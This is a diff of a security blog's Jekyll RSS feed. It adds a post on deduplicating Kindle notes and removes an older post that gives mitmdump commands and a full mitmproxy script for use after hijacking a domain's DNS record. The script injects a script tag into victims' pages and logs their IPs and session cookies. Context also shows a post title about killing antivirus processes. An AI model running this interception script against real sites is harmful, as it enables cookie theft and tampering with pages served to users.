@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 30 Sep 2018 20:32:00 +0800</pubDate>
-    <lastBuildDate>Sun, 30 Sep 2018 20:32:00 +0800</lastBuildDate>
+    <pubDate>Sun, 30 Sep 2018 20:55:36 +0800</pubDate>
+    <lastBuildDate>Sun, 30 Sep 2018 20:55:36 +0800</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
     
       <item>
@@ -2394,6 +2394,39 @@
       </item>
     
       <item>
+        <title>kindle笔记整理</title>
+        <description>&lt;h3 id=&quot;env&quot;&gt;Env&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;macOS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;p&gt;1.在macOS上下载klib用于提取和初步整理kindle设备上的笔记,usb连接kindle和macOS后打开klib并将kindle中的笔记导入klib&lt;/p&gt;
+
+&lt;p&gt;2.由于kindle中的笔记不能自动识别重复的内容，通过&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/tidy_kindle_note.py&quot;&gt;tidy_kindle_note.py&lt;/a&gt;来进一步整理去重，用法为&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 tidy_kindle_note.py&lt;/code&gt;,详细步骤如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;在klib中的对应的要使用tidy_kindle_note.py来进行去重的书名上右键，选择复制,如下图：
+&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/klib.png&quot; alt=&quot;klib&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;将复制后的内容保存到&lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/1&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;运行&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 tidy_kindle_note.py&lt;/code&gt;,整理好的文件为&lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Sun, 30 Sep 2018 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2018/09/30/kindle%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2018/09/30/kindle%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</guid>
+        
+        <category>kindle</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
+    
+      <item>
         <title>管理员权限杀卡巴斯基进程</title>
         <description>&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
 
@@ -2471,76 +2504,6 @@ goto start
         
         
         <category>炒股</category>
-        
-      </item>
-    
-      <item>
-        <title>域名劫持后利用脚本</title>
-        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
-
-&lt;p&gt;本文记录一种在域名劫持后通过mitmproxy进行http会话劫持的利用脚本,该脚本通过mitmdump的反向代理工作模式进行流量劫持.&lt;/p&gt;
-
-&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
-
-&lt;p&gt;1.通过修改域名的A记录来进行域名劫持&lt;/p&gt;
-
-&lt;p&gt;2.在域名的新A记录主机上安装mitmproxy:&lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install mitmproxy&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;3.在域名的新A记录主机上运行:
-    &lt;code class=&quot;highlighter-rouge&quot;&gt;mitmdump --set allow_remote=true -—listen-host 0.0.0.0 -s xdomain.py --mode reverse:http://xxx.xxx.xxx:80 -p 80&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--listen-host代表本地监听ip
---mode reverse代表以反向代理的模式进行工作
---set allow_remote=true代表支持客户端访问的时候是通过代理访问的
-运行时需要需要上面命令中的http://xxx.xxx.xxx:80为目标网站地址,且修改下面代码中的http://xxx.xxx.xxx为目标网站地址
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
-import re
-import chardet
-
-
-def request(flow):
-    # url=flow.request.url
-    # flow.request.headers['User-Agent']='xxx'
-    pass
-
-
-def response(flow):
-    url = flow.request.url
-    print(url)
-    if &quot;http://xxx.xxx.xxx&quot; in url:
-        content = flow.response.content
-        cookie = flow.request.headers['Cookie']
-        ip = str(flow.client_conn.ip_address).split(&quot;:&quot;)[0]
-        bytes_encoding = chardet.detect(content)['encoding']
-        origin_html = content.decode(encoding=bytes_encoding, errors=&quot;ignore&quot;)
-        if &quot;&amp;lt;/html&amp;gt;&quot; in origin_html:
-            insert_xss = '''&amp;lt;script&amp;gt;alert(&quot;you're hacked&quot;)&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;'''
-            new_html = origin_html.replace(&quot;&amp;lt;/html&amp;gt;&quot;, insert_xss)
-            flow.response.text = new_html
-        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
-        with open(&quot;mitm.log&quot;, &quot;a+&quot;) as f:
-            f.write(str(return_value) + &quot;\n&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/xdomain.py&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 29 May 2018 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</guid>
-        
-        <category>mitmproxy</category>
-        
-        <category>mitmdump</category>
-        
-        
-        <category>web</category>
         
       </item>
     
